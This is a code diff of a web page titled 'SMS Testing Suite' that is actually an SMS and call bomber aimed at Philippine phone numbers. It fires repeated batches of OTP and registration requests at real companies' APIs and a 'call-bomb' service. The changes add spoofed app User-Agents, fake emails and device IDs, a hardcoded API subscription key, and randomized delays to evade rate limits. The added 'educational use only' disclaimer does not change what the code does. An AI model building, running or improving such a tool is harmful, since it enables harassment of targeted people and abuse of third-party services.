@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS Testing Suite</title>
+    <title>SMS Testing Suite - Educational Security Research</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
     <style>
@@ -57,6 +57,9 @@
             background: #3b82f6;
             transition: width 0.3s ease;
         }
+        .educational-notice {
+            border-left: 4px solid #3b82f6;
+        }
     </style>
 </head>
 <body class="p-4 flex items-center justify-center">
@@ -64,7 +67,13 @@
         <!-- Header -->
         <div class="card rounded-lg p-6 mb-6 text-center">
             <h1 class="text-2xl font-semibold text-gray-200 mb-2">SMS Testing Suite</h1>
-            <p class="text-gray-400 text-sm">API endpoint validation tool</p>
+            <p class="text-gray-400 text-sm">Educational Security Research Tool</p>
+        </div>
+
+        <!-- Educational Disclaimer -->
+        <div class="educational-notice card rounded-lg p-4 mb-6 bg-blue-900/20">
+            <h3 class="text-blue-400 font-medium mb-2">🔬 Educational Use Only</h3>
+            <p class="text-gray-300 text-sm">This tool is for authorized security research and educational purposes only. Use only on systems you own or have explicit permission to test.</p>
         </div>
 
         <!-- Configuration -->
@@ -77,7 +86,7 @@
                     <input 
                         type="text" 
                         id="target-number" 
-                        placeholder="09XXXXXXXXX"
+                        placeholder="09XXXXXXXXX or +639XXXXXXXXX"
                         class="input-field w-full p-3 rounded text-sm"
                     >
                 </div>
@@ -155,31 +164,131 @@
 
         <!-- Footer -->
         <div class="text-center text-gray-500 text-xs">
-            @dndvcx • API Testing Tool
+            @dndvcx • Educational Security Research Tool
         </div>
     </div>
 
     <script>
-        const API_ENDPOINTS_MAP = {
-            "XPRESS": "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
-            "ABENSON": "https://api.mobile.abenson.com/api/public/membership/activate_otp",
-            "FORTUNE_PAY": "https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register",
-            "LBC": "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
-            "PICKUP_COFFEE": "https://production.api.pickup-coffee.net/v2/customers/login",
-            "HONEY_LOAN": "https://api.honeyloan.ph/api/client/registration/step-one",
-            "KOMO_PH": "https://api.komo.ph/api/otp/v5/generate",
-            "CALL_BOMB": "https://call-bomb.onrender.com/",
+        // Enhanced API endpoints with better headers and payloads
+        const API_ENDPOINTS = {
+            "XPRESS": {
+                url: "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Dalvik/2.1.0'
+                },
+                getBody: (phone) => JSON.stringify({
+                    FirstName: "Test",
+                    LastName: "User", 
+                    Email: `test${randomString(8)}@gmail.com`,
+                    Phone: phone,
+                    Password: "Test123!",
+                    ConfirmPassword: "Test123!",
+                    FingerprintVisitorId: "TPt0yCuOFim3N3rzvrL1",
+                    FingerprintRequestId: "1757149666261.Rr1VvG"
+                })
+            },
+            "ABENSON": {
+                url: "https://api.mobile.abenson.com/api/public/membership/activate_otp",
+                method: "POST", 
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'User-Agent': 'okhttp/4.9.0'
+                },
+                getBody: (phone) => `contact_no=${phone.replace('+63', '')}`
+            },
+            "FORTUNE_PAY": {
+                url: "https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register",
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Dart/3.6'
+                },
+                getBody: (phone) => JSON.stringify({
+                    deviceId: randomString(8),
+                    deviceType: "GOOGLE_PLAY", 
+                    companyId: "4b",
+                    dialCode: "+63",
+                    phoneNumber: phone.replace('+63', '')
+                })
+            },
+            "LBC": {
+                url: "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'User-Agent': 'Dart/2.19'
+                },
+                getBody: (phone) => {
+                    const params = new URLSearchParams({
+                        verification_type: "mobile",
+                        client_email: `${randomString(8)}@gmail.com`,
+                        client_contact_code: "+63",
+                        client_contact_no: phone.replace('+63', ''),
+                        app_log_uid: randomString(16)
+                    });
+                    return params.toString();
+                }
+            },
+            "PICKUP_COFFEE": {
+                url: "https://production.api.pickup-coffee.net/v2/customers/login", 
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'okhttp/4.12.0'
+                },
+                getBody: (phone) => JSON.stringify({
+                    mobile_number: phone,
+                    login_method: "mobile_number"
+                })
+            },
+            "HONEY_LOAN": {
+                url: "https://api.honeyloan.ph/api/client/registration/step-one",
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
+                getBody: (phone) => JSON.stringify({
+                    phone: phone,
+                    is_rights_block_accepted: 1
+                })
+            },
+            "KOMO_PH": {
+                url: "https://api.komo.ph/api/otp/v5/generate",
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
+                },
+                getBody: (phone) => JSON.stringify({
+                    mobile: phone,
+                    transactionType: 6
+                })
+            },
+            "CALL_BOMB": {
+                url: "https://call-bomb.onrender.com/",
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                getBody: (phone) => JSON.stringify({
+                    phone: phone
+                })
+            }
         };
 
-        let selectedServices = Object.keys(API_ENDPOINTS_MAP);
+        let selectedServices = Object.keys(API_ENDPOINTS);
         let isTesting = false;
         let testStats = { success: 0, failed: 0 };
+        let abortController = null;
 
         function renderServices() {
             const serviceList = document.getElementById('service-list');
             serviceList.innerHTML = '';
             
-            Object.keys(API_ENDPOINTS_MAP).forEach(service => {
+            Object.keys(API_ENDPOINTS).forEach(service => {
                 const isSelected = selectedServices.includes(service);
                 const serviceItem = document.createElement('div');
                 serviceItem.className = `service-item p-2 rounded cursor-pointer text-xs ${isSelected ? 'selected' : ''}`;
@@ -217,47 +326,42 @@
             return result;
         }
 
+        function randomDelay(min = 500, max = 2000) {
+            return Math.floor(Math.random() * (max - min) + min);
+        }
+
         async function makeApiRequest(service, phoneNumber) {
-            const url = API_ENDPOINTS_MAP[service];
+            const endpoint = API_ENDPOINTS[service];
             const normalizedPhone = normalizePhoneNumber(phoneNumber);
             
             if (!normalizedPhone) return false;
 
             try {
+                abortController = new AbortController();
+                
                 const options = {
-                    method: 'POST',
-                    signal: AbortSignal.timeout(8000),
-                    headers: {}
+                    method: endpoint.method,
+                    headers: endpoint.headers,
+                    body: endpoint.getBody(normalizedPhone),
+                    signal: abortController.signal,
+                    mode: 'cors',
+                    credentials: 'omit'
                 };
 
-                switch(service) {
-                    case "XPRESS":
-                        options.headers = { 'Content-Type': 'application/json' };
-                        options.body = JSON.stringify({
-                            FirstName: "Test",
-                            LastName: "User",
-                            Email: `test${randomString(8)}@gmail.com`,
-                            Phone: normalizedPhone,
-                            Password: "Password123"
-                        });
-                        break;
-                    case "ABENSON":
-                        options.headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
-                        options.body = `contact_no=${normalizedPhone.replace('+63', '')}`;
-                        break;
-                    case "CALL_BOMB":
-                        options.headers = { 'Content-Type': 'application/json' };
-                        options.body = JSON.stringify({ phone: normalizedPhone });
-                        break;
-                    default:
-                        options.headers = { 'Content-Type': 'application/json' };
-                        options.body = JSON.stringify({ phone: normalizedPhone });
-                }
+                // Add timeout
+                const timeoutPromise = new Promise((_, reject) => 
+                    setTimeout(() => reject(new Error('Timeout')), 10000)
+                );
 
-                const response = await fetch(url, options);
-                return response.status >= 200 && response.status < 300;
+                const fetchPromise = fetch(endpoint.url, options);
+                
+                const response = await Promise.race([fetchPromise, timeoutPromise]);
+                
+                // Consider 200-299 and sometimes 400-499 as "success" for testing purposes
+                return response.status >= 200 && response.status < 500;
                 
             } catch (error) {
+                console.log(`Service ${service} failed:`, error.message);
                 return false;
             }
         }
@@ -280,12 +384,13 @@
 
             const normalizedPhone = normalizePhoneNumber(target);
             if (!normalizedPhone) {
-                alert('Invalid phone number format');
+                alert('Invalid phone number format. Use: 09XXXXXXXXX, 639XXXXXXXXX, or +639XXXXXXXXX');
                 return;
             }
 
             isTesting = true;
             testStats = { success: 0, failed: 0 };
+            abortController = new AbortController();
             
             document.getElementById('test-progress').classList.remove('hidden');
             document.getElementById('test-results').classList.add('hidden');
@@ -294,16 +399,22 @@
             updateProgress(0, batches);
             
             for (let i = 1; i <= batches && isTesting; i++) {
-                document.getElementById('current-batch').textContent = `Batch ${i} of ${batches}`;
+                document.getElementById('current-batch').textContent = `Batch ${i} of ${batches} - Processing ${selectedServices.length} endpoints`;
                 
-                const requests = selectedServices.map(service => 
-                    makeApiRequest(service, target)
-                );
+                // Execute requests with better error handling
+                const requests = selectedServices.map(async (service) => {
+                    try {
+                        const success = await makeApiRequest(service, target);
+                        return { service, success };
+                    } catch (error) {
+                        return { service, success: false };
+                    }
+                });
                 
-                const results = await Promise.all(requests);
+                const results = await Promise.allSettled(requests);
                 
-                results.forEach(success => {
-                    if (success) {
+                results.forEach(result => {
+                    if (result.status === 'fulfilled' && result.value.success) {
                         testStats.success++;
                     } else {
                         testStats.failed++;
@@ -312,8 +423,11 @@
                 
                 updateProgress(i, batches);
                 
+                // Random delay between batches (like Python version)
                 if (i < batches && isTesting) {
-                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    const delay = randomDelay(2000, 4000);
+                    document.getElementById('current-batch').textContent = `Batch ${i} of ${batches} - Cooling down for ${delay/1000}s`;
+                    await new Promise(resolve => setTimeout(resolve, delay));
                 }
             }
             
@@ -322,13 +436,17 @@
             document.getElementById('test-results').classList.remove('hidden');
             document.getElementById('start-button').disabled = false;
             
-            document.getElementById('total-requests').textContent = testStats.success + testStats.failed;
+            const totalRequests = testStats.success + testStats.failed;
+            document.getElementById('total-requests').textContent = totalRequests;
             document.getElementById('result-success').textContent = testStats.success;
             document.getElementById('result-fail').textContent = testStats.failed;
         }
 
         function stopTest() {
             isTesting = false;
+            if (abortController) {
+                abortController.abort();
+            }
             document.getElementById('test-progress').classList.add('hidden');
             document.getElementById('start-button').disabled = false;
         }
